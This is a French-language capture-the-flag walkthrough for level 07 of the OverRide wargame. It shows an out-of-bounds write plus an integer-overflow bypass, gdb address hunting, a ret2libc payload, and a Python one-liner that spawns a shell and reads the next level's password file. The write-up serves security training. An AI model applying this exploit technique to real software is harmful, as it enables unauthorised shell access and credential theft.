# 🛡️ Walkthrough : Level 07 (OverRide)

### 1\. Analyse des vulnérabilités

Le binaire présente deux failles majeures :

-   **Out-of-Bounds (OOB) Write** : La fonction `store_number` ne vérifie pas la limite supérieure du tableau `data[100]`.
    
-   **Logic Error (Integer Overflow)** : Le filtre de sécurité sur l'index peut être contourné par un dépassement d'entier 32 bits.
    

* * *

### 2\. Investigation avec GDB (Récupération des adresses)

Pour construire l'exploit, nous devons trouver trois informations cruciales dans l'environnement d'exécution.

#### A. Trouver l'index de l'EIP (Adresse de retour)

On cherche la distance entre le début de notre tableau `data` et l'endroit où le programme stocke l'adresse de retour.

Bash

    gdb ./level07
    (gdb) break main
    (gdb) run
    (gdb) info frame
    # Repère "saved eip" (ex: 0xffffcf2c)
    (gdb) p/x $ebp - 0x1bc
    # Donne le début de data (ex: 0xffffcd6c)

**Calcul :** (0xffffcf2c−0xffffcd6c)/4\=114. L'EIP est à l'index **114**.

#### B. Trouver l'adresse de `system()`

Bash

    (gdb) p system
    # Réponse : $1 = {<text variable, no debug info>} 0xf7e6aed0 <system>

#### C. Trouver l'adresse de la chaîne `"/bin/sh"`

On cherche cette chaîne à l'intérieur de la bibliothèque standard (libc).

Bash

    (gdb) find &system, +10000000, "/bin/sh"
    # Réponse : 0xf7f897ec

* * *

### 3\. Stratégie de contournement "Wil"

#### A. Contourner le Modulo 3 (Integer Overflow)

Le filtre `if (index % 3 == 0)` bloque l'index **114**. Pour passer, on utilise l'index géant **`1073741938`**.

-   **Preuve** : 1073741938×4\=4294967752.
    
-   En 32 bits, ce nombre dépasse la limite (232) et "boucle" : 4294967752(mod232)\=456.
    
-   456/4\=114. On écrit au bon endroit, mais 1073741938(mod3)\=1, donc la sécurité nous laisse passer.
    

#### B. Contourner le filtre d'adresse

Le binaire bloque `0xb7`. Or, nos adresses (trouvées ci-dessus) commencent par **`0xf7`**. La protection est donc inopérante.

* * *

### 4\. Préparation du Payload (Ret2Libc)

| Élément | Index (Pile) | Adresse Hexa | Valeur Décimale |
| --- | --- | --- | --- |
| **`system()`** | 114 (EIP) | `0xf7e6aed0` | **`4159090384`** |
| **Dummy Return** | 115 | `0x00000000` | **`0`** |
| **`"/bin/sh"`** | 116 (Arg) | `0xf7f897ec` | **`4160264172`** |

Exporter vers Sheets

* * *

### 5\. La Commande de Victoire

On utilise Python pour envoyer les entrées et `cat` pour maintenir le shell ouvert.

Bash

    (python -c 'print "store\n4159090384\n1073741938\n" + "store\n4160264172\n116\n" + "quit\n"'; cat) | ./level07

* * *

### 6\. Récupération du Flag

Une fois l'exploit lancé, le shell devient interactif (bien qu'invisible) :

1.  Tape `whoami` → doit répondre `level08`.
    
2.  Récupère le mot de passe :
    

Bash

    cat /home/users/level08/.pass

